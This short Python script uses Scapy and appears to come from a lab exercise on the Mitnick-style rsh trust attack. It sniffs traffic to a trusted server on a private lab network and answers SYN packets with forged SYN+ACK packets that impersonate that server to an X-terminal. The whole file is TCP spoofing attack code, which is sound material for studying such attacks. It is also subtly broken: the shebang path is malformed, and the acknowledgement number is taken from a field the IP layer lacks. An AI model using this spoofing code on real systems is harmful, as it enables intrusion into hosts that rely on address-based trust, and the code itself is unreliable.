#!usr/bin/python3
from scapy.all import *
import sys

X_terminal_IP = "10.9.0.5"
X_terminal_Port = 514
X_terminal_Port_2 = 1023
Trusted_Server_IP = "10.9.0.6"
Trusted_Server_Port = 1023
Trusted_Server_Port_2 = 9090
	
def spoof_pkt(pkt):
    sequence = 378933595
    old_ip = pkt[IP]
    old_tcp = pkt[TCP]
    tcp_len = old_ip.len - old_ip.ihl*4 - old_tcp.dataofs*4
    print("{}:{} -> {}:{} Flags={} Len={}".format(old_ip.src, old_tcp.sport,
		old_ip.dst, old_tcp.dport, old_tcp.flags, tcp_len))
	

    if old_tcp.flags == "S" and old_tcp.dport == Trusted_Server_Port_2 and old_ip.dst ==     Trusted_Server_IP:
       print("Sending Spoofed SYN+ACK Packet ...")
       IPLayer = IP(src=Trusted_Server_IP, dst=X_terminal_IP)
       TCPLayer = TCP(sport=Trusted_Server_Port_2,dport=X_terminal_Port_2,flags="SA",
		 seq=sequence, ack= old_ip.seq + 1)
       pkt = IPLayer/TCPLayer
       send(pkt,verbose=0)
       
pkt = sniff(iface='br-1c395416d78d',filter="tcp and dst host 10.9.0.6", prn=spoof_pkt)

